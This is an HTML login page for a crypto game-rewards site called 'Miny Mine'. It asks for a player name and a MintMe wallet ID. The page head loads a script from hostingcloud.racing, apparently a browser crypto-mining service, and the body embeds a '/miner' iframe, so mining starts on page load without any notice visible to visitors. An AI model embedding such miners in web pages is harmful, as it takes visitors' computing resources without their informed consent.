<!-- This is a miny API for MTCG to mine your own MintMe -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Miny Mine</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <script src="https://mindsgaming.glitch.me//mtcg/docs.js"></script>
    <script src="https://mindsgaming.glitch.me//mtcg/invest.js"></script>
    <script src="https://mindsgaming.glitch.me//mtcg/deck/playcard.js"></script>
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <!-- import the webpage's stylesheet -->
    <link rel="stylesheet" href="https://ipack.glitch.me/mgicons.css" defer />
    <link rel="stylesheet" href="https://mindsgaming.glitch.me/cpu.css" defer />

    <link rel="stylesheet" href="https://mtcg.glitch.me/fly.css" />
    <link
      rel="stylesheet"
      href="https://mindsgaming.glitch.me/mtcg/style.css"
    />

    <!-- import the webpage's client-side javascript file -->
    <script src="https://mtcg.glitch.me/js/fly.js" defer></script>
    <script src="https://mtcg.glitch.me/js/mice.js" defer></script>

    <style>
      .rewads {
        color: gold;
        font-size: 19px;
      }
      .donate {
        width: 60%;
        display: block;
      }
      .donateBTN {
        display: block;
        margin-left: 10px;
        border-style: groove;
        border-color: gold;
        background-color: white;
        color: blue;
      }
    </style>
  </head>

  <body class="BETA" id="MGdark">
    <miner><iframe src="/miner"></iframe></miner>
    <iframe src="https://mtcg.glitch.me/#popcorn" class="SuperSplash"> </iframe>

    <br />
    <div class="SuperLogin" id="login">
      <div class="backgrounds">
      
      
      
      </div>

      <div class="LOGIN" align="center">
        <h2>
          MindsGaming Blockchain Rewards
          <p class="blockchain">
            Earn Blockchain Tokens By Playing Games!
          </p>
        </h2>
        <form>
          <a
            href="https://mindsgaming.glitch.me/mtcg/docs/game.html"
            class="questions"
            title="Learn More"
            >?</a
          >
          <input
            name="username"
            aria-label="a new dream"
            type="text"
            maxlength="100"
            placeholder="Player Name"
          />
          <input
            name="dream"
            aria-label="a new dream"
            type="text"
            maxlength="100"
            placeholder="Wallet ID"
            required
          />
          <div>
            <div
              class="dreamtoken"
              id="doobettertokens"
              onclick="doobettertokens();"
            >
              DooBetter
            </div>
          </div>
          <input
            type="hidden"
            list="tokens"
            name="tokens"
            id="token"
            placeholder="Reward Token"
            value="DooBetter"
          />

          <datalist id="tokens">
            <option value="GAMER"> </option>
            <option value="DOOBETTER"> </option>
            <option value="Eclipse"> </option>
          </datalist>
          <br />
          <br />
          <a
            href="https://www.mintme.com/token/MTCG/invite"
            class="guest"
            target="_blank"
          >
            Get A Wallet</a
          >
          <button type="submit" id="submit-dream">Login</button>

          <br />
          <div class="guest" onclick="guest();">
            Guest
          </div>
        </form>
      </div>
    </div>
  </body>
</html>
